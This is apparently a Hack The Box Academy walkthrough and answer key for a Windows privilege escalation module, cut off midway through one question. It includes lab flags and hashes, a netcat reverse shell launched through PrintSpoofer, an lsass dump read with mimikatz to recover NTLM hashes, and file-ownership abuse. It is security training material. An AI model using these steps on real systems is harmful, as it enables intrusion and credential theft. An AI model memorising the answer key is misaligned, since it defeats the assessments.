
![[cheatsheat-Windows Privilege Escalation]]

# Windows Privilege Escalation Module

## Section Questions and their Answers

| Section                                                  | Question Number | Answer                                  |
| -------------------------------------------------------- | --------------- | --------------------------------------- |
| Situational Awareness                                    | Question 1      | 172.16.20.45                            |
| Situational Awareness                                    | Question 2      | powershell_ise.exe                      |
| Initial Enumeration                                      | Question 1      | SeTakeOwnershipPrivilege                |
| Initial Enumeration                                      | Question 2      | sarah                                   |
| Initial Enumeration                                      | Question 3      | tomcat8                                 |
| Initial Enumeration                                      | Question 4      | sccm_svc                                |
| Initial Enumeration                                      | Question 5      | console                                 |
| Communication with Processes                             | Question 1      | filezilla server                        |
| Communication with Processes                             | Question 2      | NT SERVICE\MSSQL$SQLEXPRESS01           |
| SeImpersonate and SeAssignPrimaryToken                   | Question 1      | F3ar_th3_p0tato!                        |
| SeDebugPrivilege                                         | Question 1      | 64f12cddaa88057e06a81b54e73b949b        |
| SeTakeOwnershipPrivilege                                 | Question 1      | 1m_th3_f1l3_0wn3r_n0W!                  |
| Windows Built-in Groups                                  | Question 1      | Car3ful_w1th_gr0up_m3mberSh1p!          |
| Event Log Readers                                        | Question 1      | W1ntergreen_gum_2021!                   |
| DnsAdmins                                                | Question 1      | Dll_abus3_ftw!                          |
| Print Operators                                          | Question 1      | Pr1nt_0p3rat0rs_ftw!                    |
| Server Operators                                         | Question 1      | S3rver_0perators_@ll_p0werfull!         |
| User Account Control                                     | Question 1      | I_bypass3d_Uac!                         |
| Weak Permissions                                         | Question 1      | Aud1t_th0se_s3rv1ce_p3rms!              |
| Kernel Exploits                                          | Question 1      | D0nt_fall_b3h1nd_0n_Patch1ng!           |
| Vulnerable Services                                      | Question 1      | Aud1t_th0se_th1rd_paRty_s3rvices!       |
| Credential Hunting                                       | Question 1      | Pr0xyadm1nPassw0rd!                     |
| Credential Hunting                                       | Question 2      | 3ncryt10n_w0nt_4llw@ys_s@v3_y0u         |
| Other Files                                              | Question 1      | 1qazXSW@3edc!                           |
| Further Credential Theft                                 | Question 1      | S3cret_db_p@ssw0rd!                     |
| Further Credential Theft                                 | Question 2      | amanda                                  |
| Further Credential Theft                                 | Question 3      | ILVCadm1n1qazZAQ!                       |
| Further Credential Theft                                 | Question 4      | Ftpuser!                                |
| Citrix Breakout                                          | Question 1      | CitR1X_Us3R_Esc@p3                      |
| Citrix Breakout                                          | Question 2      | C1tr!x_3sC@p3_@dm!n                     |
| Interacting with Users                                   | Question 1      | Password1                               |
| Pillaging                                                | Question 1      | mRemoteNG                               |
| Pillaging                                                | Question 2      | Princess01!                             |
| Pillaging                                                | Question 3      | HTB{Stealing_Cookies_To_AccessWebSites} |
| Pillaging                                                | Question 4      | Superbackup!                            |
| Pillaging                                                | Question 5      | BAC9DC5B7B4BEC1D83E0E9C04B477F26        |
| Miscellaneous Techniques                                 | Question 1      | !QAZXSW@3edc                            |
| Windows Server                                           | Question 1      | L3gacy_st1ill_pr3valent!                |
| Windows Desktop Versions                                 | Question 1      | Cm0n_l3ts_upgRade_t0_win10!             |
| Windows Privilege Escalation Skills Assessment - Part I  | Question 1      | 3199986&3200970                         |
| Windows Privilege Escalation Skills Assessment - Part I  | Question 2      | car3ful_st0rinG_cr3d$                   |
| Windows Privilege Escalation Skills Assessment - Part I  | Question 3      | Ev3ry_sysadm1ns_n1ghtMare!              |
| Windows Privilege Escalation Skills Assessment - Part I  | Question 4      | 5e5a7dafa79d923de3340e146318c31a        |
| Windows Privilege Escalation Skills Assessment - Part II | Question 1      | Inl@n3fr3ight_sup3rAdm1n!               |
| Windows Privilege Escalation Skills Assessment - Part II | Question 2      | el3vatEd_1nstall$_v3ry_r1sky            |
| Windows Privilege Escalation Skills Assessment - Part II | Question 3      | password1                               |

## Acronyms Used in Writeups

|Acronym|Meaning|
|---|---|
|STMIP|Spawned Target Machine IP Address|
|STMPO|Spawned Target Machine Port|
|PMVPN|Personal Machine with a Connection to the Academy's VPN|
|PWNIP|Pwnbox IP Address (or PMVPN IP Address)|
|PWNPO|Pwnbox Port (or PMVPN Port)|

# Situational Awareness

## Question 1

### "What is the IP address of the other NIC attached to the target host?"

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Once connected to the Windows target, students need to open Command Prompt or PowerShell and issue `ipconfig` with the `/all` option:

Code: cmd

```cmd
ipconfig /all
```

```cmd-session
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\htb-student>ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WINLPE-SRV01
   Primary Dns Suffix  . . . . . . . :
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : htb

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B9-44-44
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::ccb6:c5ec:fbd4:36b6%2(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.20.45(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 172.16.20.1
   DHCPv6 IAID . . . . . . . . . . . : 151015510
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2A-C8-BE-D2-00-50-56-B9-44-44
   DNS Servers . . . . . . . . . . . : 8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
<SNIP>
```

Students need to look for the IPv4 address shown in the command output, specifically the value of the `IPv4 Address` field, which is `172.16.20.45`.

Answer: `172.16.20.45`

# Situational Awareness

## Question 2

### "What executable other than cmd.exe is blocked by AppLocker"

From the previously established RDP session, students can now open PowerShell and use the `Get-AppLockerPolicy` Cmdlet:

Code: powershell

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

```powershell-session
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Users\htb-student>  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections


PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%SYSTEM32%\WindowsPowerShell\v1.0\powershell_ise.exe}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 684d8b3e-7656-4451-8abe-2588d772db8f
Name                : Block PowerShell ISE
Description         :
UserOrGroupSid      : S-1-1-0
Action              : Deny

<SNIP>
```

Students need to look through the output to discover the `powershell_ise.exe` file being blocked. This can be determined/deduced by looking at the `PathConditions` as well as the `Name` fields value.

Answer: `powershell_ise.exe`

# Initial Enumeration

## Question 1

### "What non-default privilege does the htb-student user have?"

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt! /dynamic-resolution
[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Once connected to the Windows target, students need to open Command Prompt as Administrator, supplying the password `HTB_@cademy_stdnt!` when prompted to:

![Windows_Privilege_Escalation_Walkthrough_Image_1.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_1.png)

![Windows_Privilege_Escalation_Walkthrough_Image_2.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_2.png)

Then, students need to run the `whoami` command with the `/priv` option:

Code: cmd

```cmd
whoami /priv
```

```cmd-session
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

From the output of the command, students will know that that the user `htb-student` has the non-default privilege `SeTakeOwnershipPrivilege` (regardless of it being disabled).

Answer: `SeTakeOwnershipPrivilege`

# Initial Enumeration

## Question 2

### "Who is a member of the Backup Operators group?"

Using the previously established RDP session, students need to open Command Prompt and run the following `net` command:

Code: cmd

```cmd
net localgroup "backup operators"
```

```cmd-session
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\htb-student>net localgroup "backup operators"
Alias name     backup operators
Comment        Backup Operators can override security restrictions for the sole purpose of backing up or restoring files

Members

-------------------------------------------------------------------------------
sarah
The command completed successfully.
```

From the output, students will know that `sarah` is the only member of the `backup operators` group.

Answer: `sarah`

# Initial Enumeration

## Question 3

### "What service is listening on port 8080 (service name not the executable)?"

Using the previously established RDP session, students need to open Command Prompt and run the following `netstat` command, with the `-ano` options:

Code: cmd

```cmd
netstat -ano
```

```cmd-session
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\htb-student>netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       2124
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       844
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3448
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       976
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       2248
```

Students need to look at the output to determine the `PID` of the service running on port `8080` and then open `Task Manager`:

![Windows_Privilege_Escalation_Walkthrough_Image_3.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_3.png)

Students need to navigate to the `Details` tab to notice that `Tomcat8` is the service.

Answer: `Tomcat8`

# Initial Enumeration

## Question 4

### "What user is logged in to the target host?"

Using the previously established RDP session, students need to open Command Prompt and run `query` on `user`:

Code: cmd

```cmd
query user
```

```cmd-session
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\htb-student>query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 sccm_svc              console             1  Active      none   9/30/2022 8:09 AM
>htb-student           rdp-tcp#4           2  Active          .  9/30/2022 8:17 AM
```

The output of this command reveals that the `sccm_svc` user currently has a session on the active Windows target machine.

Answer: `sccm_svc`

# Initial Enumeration

## Question 5

### "What type of session does this user have?"

Students can refer to the output of the command run in the previous question:

Code: cmd

```cmd
query user
```

```cmd-session
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\htb-student>query user
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 sccm_svc              console             1  Active      none   9/30/2022 8:09 AM
>htb-student           rdp-tcp#4           2  Active          .  9/30/2022 8:17 AM
```

From the output of `query`, students will know that the `SESSIONNAME` for the `sccm_svc` user is `console`.

Answer: `console`

# Communication with Processes

## Question 1

### "What service is listening on 0.0.0.0:21?\(two words\)"

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Once connected to the Windows target, students need to open Command Prompt and run `netstat` to discover the Process ID of the service running on port 21:

Code: cmd

```cmd
netstat -ano
```

![Windows_Privilege_Escalation_Walkthrough_Image_4.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_4.png)

Using the discovered Process ID, students then need to use `tasklist`, piping its output to `findstr`:

Code: cmd

```cmd
tasklist | findstr /c:"2156"
```

```cmd-session
C:\Users\htb-student>tasklist | findstr /c:"2156"

FileZilla Server.exe          2156 Services                   0     11,036 K
```

From the output of `tasklist`, students know that `FileZilla Server` is currently listening on port 21.

Answer: `FileZilla Server`

# Communication with Processes

## Question 2

### "Which account has WRITE\_DAC privileges over the \\pipe\\SQLLocal\\SQLEXPRESS01 named pipe?"

From the previously established RDP session, students need to open Command Prompt or PowerShell, navigate to `C:\Tools\AccessChk`, and then run `AccessChk.exe`:

Code: cmd

```cmd
cd C:\Tools\AcccessChk
accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v
```

```cmd-session
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Users\htb-student>cd C:\Tools\AccessChk
C:\Tools\AccessChk>accesschk.exe -accepteula -w \pipe\SQLLocal\SQLEXPRESS01 -v

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

\\.\Pipe\SQLLocal\SQLEXPRESS01
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT SERVICE\MSSQL$SQLEXPRESS01
        FILE_CREATE_PIPE_INSTANCE
        FILE_APPEND_DATA
        READ_CONTROL
        WRITE_DAC
  RW Everyone
        FILE_ADD_FILE
        FILE_LIST_DIRECTORY
        FILE_READ_ATTRIBUTES
        FILE_READ_DATA
        FILE_READ_EA
        FILE_WRITE_ATTRIBUTES
        FILE_WRITE_DATA
        FILE_WRITE_EA
        SYNCHRONIZE
        READ_CONTROL
```

Students will know from the output that the `NT Service\MSSQL$SQLEXPRESS01` account has the `WRITE_DAC` privilege.

Answer: `NT Service\MSSQL$SQLEXPRESS01`

# SeImpersonate and SeAssignPrimaryToken

## Question 1

### "Escalate privileges using one of the methods shown in this section. Submit the contents of the flag file located at C:\\Users\\Administrator\\Desktop\\SeImpersonate\\flag.txt"

Students need to connect to the Windows target using `mssqlclient.py` with the credentials `sql_dev:Str0ng_P@ssw0rd!`:

Code: shell

```shell
mssqlclient.py sql_dev@STMIP -windows-auth
```

```shell-session
┌─[us-academy-1]─[10.10.14.143]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ mssqlclient.py sql_dev@10.129.43.43 -windows-auth
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
[!] Press help for extra shell commands
SQL> 
```

Then, students need to invoke `enable_xp_cmdshell` to enable `xp_cmdshell` and enumerate the `SeImpersonatePrivilege` permission:

Code: cmd

```cmd
enable_xp_cmdshell
xp_cmdshell whoami /priv
```

```cmd-session
SQL> enable_xp_cmdshell

[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
[*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami /priv

output                                                                             
--------------------------------------------------------------------------------   
NULL                                                                               

PRIVILEGES INFORMATION                                                             
----------------------                                                             
NULL                                                                               

Privilege Name                Description                               State      
============================= ========================================= ========   
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
SeCreateGlobalPrivilege       Create global objects                     Enabled    
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   

NULL        
```

Using another tab, students need to start a `netcat` listener in preparation to catch the incoming reverse shell:

Code: shell

```shell
nc -lvnp PWNPO
```

```shell-session
┌─[us-academy-1]─[10.10.14.143]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ nc -lvnp 8443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8443
Ncat: Listening on 0.0.0.0:8443
```

From the previously established connection with `mssclient.py`, students need to initiate a `nc` reverse shell with elevated permissions via `PrintSpoofer.exe`:

Code: cmd

```cmd
xp_cmdshell c:\tools\PrintSpoofer.exe -c "C:\tools\nc.exe PWNIP PWNPO -e cmd.exe"
```

```cmd-session
SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "C:\tools\nc.exe 10.10.14.143 8443 -e cmd.exe"

output                                                                             
--------------------------------------------------------------------------------   
[+] Found privilege: SeImpersonatePrivilege                                        
[+] Named pipe listening...

<SNIP>
```

And in the `nc` listener terminal, students will notice the reverse shell connection has been established successfully:

```shell-session
┌─[us-academy-1]─[10.10.14.143]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ nc -lvnp 8443

Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::8443
Ncat: Listening on 0.0.0.0:8443
Ncat: Connection from 10.129.43.43.
Ncat: Connection from 10.129.43.43:49699.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

From the reverse shell, students need to print out the contents of the flag file located at `C:\Users\Administrator\Desktop\SeImpersonate\flag.txt`:

Code: cmd

```cmd
type C:\Users\Administrator\Desktop\SeImpersonate\flag.txt
```

```cmd-session
C:\Windows\System32>type C:\Users\Administrator\Desktop\SeImpersonate\flag.txt

F3ar_th3_p0tato!
```

Answer: `F3ar_th3_p0tato!`

# SeDebugPrivilege

## Question 1

### "Leverage SeDebugPrivilege rights and obtain the NTLM password hash for the sccm_svc account."

Students first need to connect to the spawned target with `xfreerdp` using the credentials `jordan:HTB_@cademy_j0rdan!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:jordan /p:HTB_@cademy_j0rdan!
```

```shell-session
┌─[us-academy-1]─[10.10.14.80]─[htb-ac330204@pwnbox-base]─[/root]
└──╼ [★]$ xfreerdp /v:10.129.43.43 /u:jordan /p:HTB_@cademy_j0rdan! /dynamic-resolution

[15:25:49:351] [2190:2191] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:25:49:351] [2190:2191] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr

<SNIP>
```

Once connected to the Windows target, students need to launch an elevated Command Prompt by right clicking Start, searching Command Prompt, right-click and Run as administrator (students will be prompted again for a password, they need to enter `HTB_@cademy_j0rdan!`):

![Windows_Privilege_Escalation_Walkthrough_Image_5.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_5.png)

![Windows_Privilege_Escalation_Walkthrough_Image_6.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_6.png)

Students then need to navigate to `C:\Tools\Procdump` and run the following command:

Code: cmd

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```cmd-session
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Tools\Procdump
C:\Tools\Procdump>procdump.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v10.0 - Sysinternals process dump utility
Copyright (C) 2009-2020 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[07:31:23] Dump 1 initiated: C:\Tools\Procdump\lsass.dmp
[07:31:23] Dump 1 writing: Estimated dump file size is 42 MB.
[07:31:24] Dump 1 complete: 42 MB written in 1.0 seconds
[07:31:24] Dump count reached.
```

Subsequently, students need to copy the `lsass.dmp` file into `C:\Tools\Mimikatz\x64`, navigate to the same directory, and then run `mimikatz.exe`:

Code: cmd

```cmd
copy lsass.dmp C:\Tools\Mimikatz\x64\
cd C:\Tools\Mimikatz\x64\
mimikatz.exe
```

```cmd-session
C:\Tools\Procdump>copy lsass.dmp C:\Tools\Mimikatz\x64
	1 file(s) copied.

C:\Tools\Procdump>cd C:\Tools\Mimikatz\x64
C:\Tools\Mimikatz\x64>mimikatz.exe

  .####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

From within `mimikatz`, students need to run the use the `sekurlsa` module to list all available provider credentials:

Code: cmd

```cmd
log
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords
```

```cmd-session
mimikatz # log

Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 710944 (00000000:000ad920)
Session           : RemoteInteractive from 2
User Name         : jordan
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 10/3/2022 7:25:55 AM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1000

<SNIP>

Authentication Id : 0 ; 234682 (00000000:000394ba)
Session           : Interactive from 1
User Name         : sccm_svc
Domain            : WINLPE-SRV01
Logon Server      : WINLPE-SRV01
Logon Time        : 10/3/2022 7:22:28 AM
SID               : S-1-5-21-3769161915-3336846931-3985975925-1012
        msv :
         [00000006] Primary
         * Username : sccm_svc
         * Domain   : WINLPE-SRV01
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
```

From the output, students will know that the `NTLM` hash of the `sccm_svc` user is `64f12cddaa88057e06a81b54e73b949b`.

Answer: `64f12cddaa88057e06a81b54e73b949b`

# SeTakeOwnershipPrivilege

## Question 1

### "Leverage the SeTakeOwnershipPrivilege rights over the file located at "C:\\TakeOwn\\flag.txt" and submit the contents."

Students first need to connect to the spawned target with `xfreerdp` using the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.43.43 /u:htb-student /p:HTB_@cademy_stdnt!

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Then, students need to run PowerShell as administrator (utilizing the credentials `htb-student:HTB_@cademy_stdnt!`):

![Windows_Privilege_Escalation_Walkthrough_Image_7.png](https://academy.hackthebox.com/storage/walkthroughs/59/Windows_Privilege_Escalation_Walkthrough_Image_7.png)

Subsequently, students need to run the `whoami` with the `/priv` option to view user privileges, to notice that `SeTakeOwnershipPrivilege`:

Code: powershell

```powershell
whoami /priv
```

```powershell-session
Windows PowerShell
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled
```

Then, students need to navigate to `C:\Tools`, import the `Enable-Privilege.ps1` module, and then run it:

Code: powershell

```powershell
cd C:\Tools
Import-Module .\Enable-Privilege.ps1
.\EnableAllTokenPrivs.ps1
```

```powershell-session
PS C:\Windows\system32> cd  C:\Tools
PS C:\Tools> Import-Module .\Enable-Privilege.ps1
PS C:\Tools> .\EnableAllTokenPrivs.ps1
```

Students then need to check user permissions again to see that `SeTakeOwnershipPrivilege` has been enabled:

Code: powershell

```powershell
whoami /priv
```

```powershell-session
PS C:\Tools> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

Thereafter, students need to use `takeown` of the file `C:\TakeOwn\flag.txt`:

Code: powershell

```powershell
takeown /f 'C:\TakeOwn\flag.txt'
```

```powershell-session
PS C:\Tools> takeown /f 'C:\TakeOwn\flag.txt'

SUCCESS: The file (or folder): "C:\TakeOwn\flag.txt" now owned by user "WINLPE-SRV01\htb-student".
```

However, when attempting to display the contents of the flag, students will notice they do not have permission:

Code: powershell

```powershell
cat C:\TakeOwn\flag.txt
```

```powershell-session
PS C:\Tools> cat C:\TakeOwn\flag.txt

cat : Access to the path 'C:\TakeOwn\flag.txt' is denied.
At line:1 char:1
+ cat C:\TakeOwn\flag.txt
+ ~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo : PermissionDenied: (C:\TakeOwn\flag.txt:String) [Get-Content], UnauthorizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

Therefore, students need to run one last `icacls` command which will grant them permission to read `flag.txt`:

Code: powershell

```powershell
icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
```

```powershell-session
PS C:\Tools> icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F

processed file: C:\TakeOwn\flag.txt
Successfully processed 1 files; Failed processing 0 files
```

At last, students can read the contents of `flag.txt`:

Code: powershell

```powershell
cat C:\TakeOwn\flag.txt
```

```powershell-session
PS C:\Tools> cat C:\TakeOwn\flag.txt

1m_th3_f1l3_0wn3r_n0W!
```

Answer: `1m_th3_f1l3_0wn3r_n0W!`

# Windows Built-in Groups

## Question 1

### "Leverage SeBackupPrivilege rights and obtain the flag located at C:\\Users\\Administrator\\Desktop\\SeBackupPrivilege\\flag.txt"

Students first need to connect to the spawned target with `xfreerdp` using the credentials `svc_backup:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:svc_backup /p:HTB_@cademy_stdnt!
```

```shell-session
┌─[us-academy-1]─[10.10.14.123]─[htb-ac330204@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.95.135 /u:svc_backup /p:HTB_@cademy_stdnt! 

[16:18:25:879] [4321:4323] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[16:18:25:880] [4321:4323] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr

<SNIP>
```

Subsequently, students need to open an elevated `PowerShell` session and enumerate user privileges with `whoami` using the `/priv` option:

Code: powershell

```powershell
whoami /priv
```

```powershell-session
PS C:\Users\svc_backup> whoami /priv

PRIVILEGES INFORMATION
